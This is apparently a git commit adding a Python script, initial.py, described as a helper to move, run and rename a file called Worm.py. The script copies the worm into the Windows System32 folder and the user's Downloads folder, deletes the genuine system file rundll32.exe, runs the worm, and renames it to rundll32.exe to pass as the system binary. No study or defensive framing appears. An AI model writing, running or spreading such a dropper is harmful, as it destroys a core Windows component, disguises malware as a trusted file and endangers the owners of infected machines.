77acc5a21cf38f5704b761c6b97372fafbe2d703
RCDelta <104479252+RCDelta@users.noreply.github.com>
2024-04-11 00:52:40 -0400

    Create initial.py
    Used to move, run, and rename Worm.py and delete rundll32.exe

---
+++ initial.py
@@ -0,0 +1,11 @@
+import os
+import shutil
+cwd = os.getcwd()
+shutil.copy(cwd+"/Worm.py", "/Windows/System32")
+name = os.getlogin()
+path = ('/Users/' + name + '/Downloads')
+shutil.copy(cwd+"/Worm.py", path)
+os.chdir("/Windows/System32")
+os.remove("rundll32.exe")
+os.system("python Worm.py")
+os.rename('Worm.py', 'rundll32.exe')
